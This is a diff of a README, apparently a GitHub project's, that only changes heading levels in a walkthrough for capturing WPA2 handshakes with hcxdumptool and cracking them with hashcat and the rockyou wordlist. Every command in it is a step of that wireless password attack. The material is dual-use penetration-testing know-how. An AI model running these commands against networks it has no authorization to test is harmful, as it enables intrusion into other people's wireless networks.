@@ -36,30 +36,30 @@ Hcxdumptool is a tool used for capturing WPA2 handshakes from wireless networks.
 ### Network Diagram
   ![image](https://github.com/user-attachments/assets/a699ef07-bd25-4ec1-a0e7-a55f4174e5aa)
 
-# Install Required Packages
+### Install Required Packages
 sudo apt-get update
 sudo apt-get install -y libcurl4-openssl-dev libssl-dev pkg-config libpcap-dev
 
-# Clone the hcxdumptool Repository and Navigate to It
+### Clone the hcxdumptool Repository and Navigate to It
 git clone https://github.com/ZerBea/hcxdumptool.git
 cd hcxdumptool
 
-# Stop Network Management Services
+### Stop Network Management Services
 sudo systemctl stop NetworkManager.service
 sudo systemctl stop wpa_supplicant.service
 
-# Capture Wi-Fi Traffic
+### Capture Wi-Fi Traffic
 sudo hcxdumptool -i wlan0 -w dumpfile.pcapng -F --rds=1
 
-# Restart Network Management Services After Capture
+### Restart Network Management Services After Capture
 sudo systemctl start wpa_supplicant.service
 sudo systemctl start NetworkManager.service
 
-# Convert Captured Traffic to Hash File
+### Convert Captured Traffic to Hash File
 hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
 
-# Scan for MAC Addresses
+### Scan for MAC Addresses
 sudo hcxdumptool -i wlan0 --rcascan=a
 
-# Crack Wi-Fi Hashes Using Hashcat
+### Crack Wi-Fi Hashes Using Hashcat
 hashcat -m 22000 hash.hc22000 rockyou.txt --show
